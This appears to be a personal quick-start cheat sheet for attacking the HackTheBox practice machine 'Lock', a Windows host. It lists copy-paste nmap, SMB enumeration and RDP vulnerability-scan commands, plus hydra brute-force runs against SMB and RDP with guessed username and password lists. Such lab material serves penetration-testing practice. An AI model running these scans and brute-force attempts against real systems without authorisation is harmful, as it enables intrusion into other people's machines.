# System 4: Lock - Quick Start Guide

## System Information
- **Name**: Lock
- **IP**: 10.129.6.226
- **OS**: Windows
- **Platform**: HackTheBox

## Quick Commands (Copy-Paste Ready)

### 1. Basic Connectivity
```bash
ping -c 4 10.129.6.226
```

### 2. Initial Port Scan
```bash
nmap -sC -sV -oN lock_initial.txt 10.129.6.226
```

### 3. Full Port Scan
```bash
nmap -p- --min-rate 2000 -oN lock_full.txt 10.129.6.226
```

### 4. SMB Enumeration (Most Important for Windows)
```bash
# Detailed SMB scan
nmap -p 445 --script smb-os-discovery,smb-security-mode,smb-enum-shares,smb-enum-users,smb-vuln-* -oN lock_smb.txt 10.129.6.226

# Enum4linux
enum4linux -a 10.129.6.226

# SMB client
smbclient -L //10.129.6.226/ -N

# SMB map
smbmap -H 10.129.6.226
```

### 5. RDP Check (if port 3389 open)
```bash
nmap -p 3389 --script rdp-enum-encryption,rdp-vuln-ms12-020 -oN lock_rdp.txt 10.129.6.226
```

### 6. Vulnerability Scan
```bash
nmap --script vuln -oN lock_vuln.txt 10.129.6.226
```

### 7. Brute Force (if needed)
```bash
# Create wordlists
cat > users.txt <<EOF
administrator
admin
guest
lock
LOCK
EOF

cat > passwords.txt <<EOF
password
Password123
lock
LOCK
Lock123
EOF

# SMB brute force
hydra -L users.txt -P passwords.txt smb://10.129.6.226 -t 4

# RDP brute force
hydra -L users.txt -P passwords.txt rdp://10.129.6.226 -t 4
```

## Complete Script

Run the complete script:
```bash
bash SCRIPTS/system4_lock_complete.sh
```

This will run all phases automatically and save results to `~/Downloads/system4_lock_*/`

## Expected Windows Services

For a Windows machine, expect:
- **Port 445**: SMB (file sharing)
- **Port 135**: MSRPC
- **Port 139**: NetBIOS
- **Port 3389**: RDP (remote desktop)
- **Port 389**: LDAP (if domain controller)
- **Port 53**: DNS (if domain controller)
- **Port 80/443**: Web (if IIS running)

## Focus Areas

1. **SMB**: Most common attack vector on Windows
2. **RDP**: Remote desktop access
3. **Web**: If IIS is running
4. **LDAP/DNS**: If it's a domain controller

## Next Steps

After running scans:
1. Review SMB enumeration results
2. Check for anonymous/null session access
3. Look for exposed shares
4. Attempt credential brute force if needed
5. Check for known vulnerabilities

